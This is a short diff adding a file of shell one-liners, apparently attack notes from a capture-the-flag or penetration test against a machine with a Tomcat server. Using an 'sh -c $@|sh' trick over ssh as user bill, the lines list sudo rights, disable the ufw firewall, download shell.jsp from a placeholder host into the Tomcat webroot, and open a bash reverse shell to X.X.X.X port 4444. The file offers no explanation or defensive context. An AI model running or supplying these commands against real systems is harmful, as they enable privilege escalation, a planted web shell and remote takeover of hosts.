@@ -1,0 +1,8 @@
+
+sh -c $@|sh . echo ssh bill@localhost sudo -l 
+
+sh -c $@|sh . echo ssh bill@localhost sudo ufw disable
+
+sh -c $@|sh . echo ssh bill@localhost sudo wget “ http://X.X.X.X:8000/shell.jsp ” -O /var/lib/tomcat8/webapps/ROOT/shell.jsp
+
+ssh bill@localhost sudo bash -i>& /dev/tcp/X.X.X.X/4444 0>&1 
